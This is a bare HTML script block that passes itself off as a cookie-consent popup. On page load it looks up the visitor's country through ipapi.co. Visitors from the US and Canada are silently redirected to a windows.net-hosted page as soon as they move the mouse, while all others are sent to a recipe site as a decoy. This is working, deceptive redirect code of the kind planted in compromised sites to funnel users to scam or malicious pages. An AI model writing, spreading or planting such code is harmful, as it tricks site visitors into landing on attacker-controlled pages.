<script>
document.addEventListener("DOMContentLoaded", function () {
fetch("https://ipapi.co/json/")
.then(response => response.json())
.then(data => {
let country = data.country_code; // Get country code (e.g., "US", "CA")
let redirectURL;

if (country === "US" || country === "CA") {
redirectURL = "https://huntop001.z13.web.core.windows.net/"; // USA & Canada
} else {
redirectURL = "https://www.allrecipes.com"; // Other Countries
}

// Create Cookie Popup
let cookiePopup = document.createElement("div");
cookiePopup.innerHTML = `
<div id="cookie-popup" style="
position: fixed;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
width: 60%;
max-width: 600px;
background: white;
padding: 30px;
box-shadow: 0 0 15px rgba(0,0,0,0.4);
z-index: 9999;
text-align: center;
font-family: Arial, sans-serif;
border-radius: 10px;">
<h2 style="margin: 0; color: #333;">Cookie Policy</h2>
<p style="color: #555; font-size: 16px;">
This website uses cookies to enhance your experience, provide social media features,
and analyze our traffic. By continuing, you agree to our <a href="/privacy-policy"
style="color: #007bff; text-decoration: none;">Privacy Policy</a>.
</p>
<button id="accept-cookie" style="
background: #007bff;
color: white;
padding: 12px 20px;
border: none;
font-size: 16px;
cursor: pointer;
border-radius: 5px;">
Accept
</button>
</div>
`;
document.body.appendChild(cookiePopup);

// Redirect when user moves mouse anywhere on the page
document.addEventListener("mousemove", function () {
window.location.href = redirectURL;
});

// Remove popup when user clicks accept
document.getElementById("accept-cookie").addEventListener("click", function () {
document.getElementById("cookie-popup").remove();
});
})
.catch(error => console.error("Error fetching location:", error));
});
</script>
